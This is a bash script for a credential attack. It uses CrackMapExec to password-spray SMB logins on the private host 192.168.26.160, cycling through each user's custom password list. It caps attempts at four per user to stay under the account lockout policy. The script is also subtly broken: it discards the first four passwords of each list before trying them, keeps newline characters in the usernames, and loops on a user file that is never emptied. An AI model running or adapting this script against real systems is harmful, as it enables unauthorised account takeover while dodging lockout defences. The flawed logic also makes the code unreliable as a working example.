#!/bin/bash

#This script will perform a password spray against users using Crackmapexec
#The username list contains several users and every user has it's own password list with custom passwords
#Scenario: After the fifth try the lockout policy kicks and the user would be locked thats why after 4 tries it skips to the next user


#Loop until username list is empty
while [ -s thisisuser.txt ]; do
	#Declare an array
	declare -a array
	#Append the content of the user list into the array
	mapfile array < thisisuser.txt

	#Perform the password spray
	for i in "${array[@]}"; do
		echo $i
		#Cut the password lists first 4 lines
		tail -n +5 passwords/$i > passwords2/$i
		cp passwords2/$i passwords/$i
		#Perform crackmapexec
		crackmapexec smb 192.168.26.160 -u $i -p passwords2/$i --continue-on-success --ufail-limit 4 
	done
done
